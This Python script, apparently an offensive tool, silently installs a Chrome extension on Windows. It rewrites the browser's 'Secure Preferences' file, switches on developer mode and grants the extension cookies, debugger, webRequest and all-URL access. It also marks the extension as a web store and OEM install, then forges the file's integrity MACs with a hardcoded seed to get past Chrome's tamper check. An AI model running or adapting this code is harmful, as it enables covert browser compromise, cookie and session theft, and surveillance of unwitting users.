import os 
import hmac 
import json 
from collections import OrderedDict
import hashlib


#https://github.com/Pica4x6/SecurePreferencesFile
def removeEmpty(d):
    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            if type(y) == (type(OrderedDict())):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif(type(y) == type({})):
                if(len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0, ""]):
                    del d[x]

    elif type(d) == type([]):
        for x, y in enumerate(d):
            if type(y) == type(OrderedDict()):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type({})):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0, ""]):
                    del d[x]

#https://github.com/Pica4x6/SecurePreferencesFile
def calculateHMAC(value_as_string, path, sid, seed):
    if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
        removeEmpty(value_as_string)
    message = sid + path + json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace('\\u2122', '™')
    print(f'[+] HMAC message: {message}')
    print(message.encode("utf-8"))
    print([f"{b:02X}" for b in message.encode("utf-8")])
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return hash_obj.hexdigest().upper()

    # removing .replace('<', '\\u003C').replace('\\u2122', '™') 

def calculate_chrome_dev_mac(seed: bytes, sid: str, pref_path: str, pref_value) -> str:
    """
    Calculates the HMAC-SHA256 for a Chrome protected preference.

    Parameters:
        seed (bytes): The secret key from PlatformKeys.
        sid (str): The Windows user SID.
        pref_path (str): The full preference path (e.g., "extensions.ui.developer_mode").
        pref_value: The preference value (e.g., True, False, a string, etc.).

    Returns:
        str: The hexadecimal HMAC digest.
    """
    # Serialize the value to canonical JSON (compact, sorted if needed)
    serialized_value = json.dumps(pref_value, separators=(',', ':'), sort_keys=True)
    
    # Build the input string
    hmac_input = (sid + pref_path + serialized_value).encode('utf-8')
    
    # Calculate the HMAC-SHA256
    return hmac.new(seed, hmac_input, hashlib.sha256).hexdigest()

#https://github.com/Pica4x6/SecurePreferencesFile
def calc_supermac(json_file, sid, seed):
    # Reads the file
    json_data = open(json_file, encoding="utf-8")
    data = json.load(json_data, object_pairs_hook=OrderedDict)
    json_data.close()
    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculates and sets the super_mac
    super_msg = sid + json.dumps(data['protection']['macs']).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def add_extension(user, sid, extension_path, extension_id):
    escaped_path = json.dumps(extension_path)[1:-1]

    print(f'[+] Using extension path: {escaped_path}')
    print(f'[+] Extension name: {extension_id}')

    extension_json = r"""{
    "active_permissions": {
        "api": [
            "activeTab",
            "cookies",
            "debugger",
            "webNavigation",
            "webRequest",
            "scripting"
        ],
        "explicit_host": [
            "<all_urls>"
        ],
        "manifest_permissions": [],
        "scriptable_host": []
    },
    "commands": {},
    "content_settings": [],
    "creation_flags": 38,
    "filtered_service_worker_events": {
        "webNavigation.onCompleted": [
            {}
        ]
    },
    "first_install_time": "13364417633506288",
    "from_webstore": true,
    "granted_permissions": {
        "api": [
            "activeTab",
            "cookies",
            "debugger",
            "webNavigation",
            "webRequest",
            "scripting"
        ],
        "explicit_host": [
            "<all_urls>"
        ],
        "manifest_permissions": [],
        "scriptable_host": []
    },
    "incognito_content_settings": [],
    "incognito_preferences": {},
    "last_update_time": "13364417633506288",
    "location": 4,
    "newAllowFileAccess": true,
    "path": "__EXTENSION_PATH__",
    "preferences": {},
    "regular_only_preferences": {},
    "service_worker_registration_info": {
        "version": "0.1.1"
    },
    "serviceworkerevents": [
        "cookies.onChanged",
        "webRequest.onBeforeRequest/s1"
    ],
    "state": 1,
    "was_installed_by_default": true,
    "was_installed_by_oem": true,
    "withholding_permissions": true
}"""

    extension_json = extension_json.replace('__EXTENSION_PATH__', escaped_path)
    
    # Using Secure Preferences
    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
    filepath="C:\\users\\{}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences".format(user)
    with open(filepath, 'rb') as f:
            data = f.read()
    f.close()

    # Loading json data
    data=json.loads(data,object_pairs_hook=OrderedDict)

    # Enable dev mode & update protection for dev mode 
    try:
        data["extensions"]["ui"]["developer_mode"]=True
        print(f'[+] Enabling dev mode')
    except KeyError: # means extensions: UI is not found
        data["extensions"].setdefault("ui", OrderedDict())
        data["extensions"]["ui"]["developer_mode"] = OrderedDict()
        data["extensions"]["ui"]["developer_mode"]= True
        print(f'[+] Dev mode never enabled. Creating and Enabling dev mode')
        print(f'[+] Enabling dev mode')

    print(f'[+] Dev mode: {data["extensions"]["ui"]["developer_mode"]}')

    #convert to ordereddict for calc and addition
    data["extensions"]["settings"][extension_id]=dict_extension
    
    ###calculate hash for [protect][mac]
    path=f"extensions.settings.{extension_id}"
    print(f'[+] path: {path}')

    #hardcoded seed
    seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    macs = calculateHMAC(dict_extension, path, sid, seed)
    print(f'[+] calculated HMAC: {macs}')

    #add macs to json file
    data["protection"]["macs"]["extensions"]["settings"][extension_id]=macs

    # Add mac for protection ui developer mode 
    pref_path = "extensions.ui.developer_mode"
    pref_value = True
    mac = calculate_chrome_dev_mac(seed, sid, pref_path, pref_value)
    try:
        data["protection"]["macs"]["extensions"]["ui"]["developer_mode"]=mac
    except KeyError:
        print("Need to toggle developer mode")
        sys.exit()
    devmode_value=r'{"developer_mode": true}'
    parseddevmode=json.loads(devmode_value, object_pairs_hook=OrderedDict)

    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
            print(f'[+] Successfully updated secure preferences file with new extension')
    z.close()
    
    ###recalculate and replace super_mac
    supermac=calc_supermac(filepath,sid,seed)
    print(f'[+] updated supermac: {supermac}')
    data["protection"]["super_mac"]=supermac
    newdata=json.dumps(data)
    with open(filepath, 'w') as z:
            z.write(newdata)
            print(f'[+] Successfully updated secure preferences with supermac')
    z.close()

def get_extension_id(path):
    m=hashlib.sha256()
    m.update(bytes(path.encode('utf-16-le'))) 
    EXTID = ''.join([chr(int(i, base=16) + ord('a')) for i in m.hexdigest()][:32])
    print("Using ExtID: {}".format(EXTID))
    return EXTID

if __name__ == "__main__":
    user=os.getlogin()
    sid='S-1-5-21-2888908146-1342698428-1910144870'
    extension_path='C:\\Users\\Public\\Downloads\\extension'
    extension_id = get_extension_id(extension_path)
    print(f'[+] User: {user}')

    add_extension(user, sid, extension_path, extension_id)